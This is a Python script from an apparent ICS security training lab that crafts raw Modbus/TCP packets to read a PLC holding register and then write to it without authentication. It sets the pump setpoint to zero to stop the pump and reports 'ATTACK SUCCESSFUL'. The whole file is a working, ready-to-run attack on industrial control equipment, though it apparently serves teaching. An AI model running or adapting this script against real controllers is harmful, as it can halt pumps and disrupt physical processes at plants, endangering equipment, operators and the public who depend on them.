#!/usr/bin/env python3
"""
Pump setpoint attack - Session 3 Lab
Demonstrates unauthorized write to process-critical register.
This script changes the pump setpoint (register 40001) to 0, stopping the pump.

Usage:
    python3 attack_pump.py --target <ip> --port <port> [--value N]
"""

import argparse
import socket
import struct
import time

def read_register(target, port, addr):
    mbap = struct.pack('>HHHB', 100, 0x0000, 6, 1)
    pdu = struct.pack('>BHH', 0x03, addr, 1)
    s = socket.socket()
    s.settimeout(3)
    s.connect((target, port))
    s.sendall(mbap + pdu)
    resp = s.recv(1024)
    s.close()
    return struct.unpack('>H', resp[9:11])[0]

def write_register(target, port, addr, value):
    mbap = struct.pack('>HHHB', 101, 0x0000, 6, 1)
    pdu = struct.pack('>BHH', 0x06, addr, value)
    s = socket.socket()
    s.settimeout(3)
    s.connect((target, port))
    s.sendall(mbap + pdu)
    resp = s.recv(1024)
    s.close()
    return resp

def main():
    p = argparse.ArgumentParser()
    p.add_argument('--target', required=True)
    p.add_argument('--port', type=int, default=502)
    p.add_argument('--value', type=int, default=0, help='New pump setpoint value')
    args = p.parse_args()

    print(f"[*] Target: {args.target}:{args.port}")
    print()

    # Step 1: Read current value
    print("[1] Reading current pump setpoint (40001)...")
    current = read_register(args.target, args.port, 0)
    print(f"    Current value: {current}")
    print()

    # Step 2: Write new value
    print(f"[2] Writing new value {args.value} to 40001...")
    write_register(args.target, args.port, 0, args.value)
    print("    Write confirmed by PLC - no authentication required")
    print()

    # Step 3: Verify
    time.sleep(0.5)
    print("[3] Verifying write...")
    new_val = read_register(args.target, args.port, 0)
    print(f"    New value: {new_val}")
    print()

    if new_val == args.value:
        print("[+] ATTACK SUCCESSFUL")
        print(f"    Pump setpoint changed from {current} to {new_val}")
        print("    In a real plant, this would stop the pump.")
    else:
        print("[-] Write did not persist")

if __name__ == '__main__':
    main()
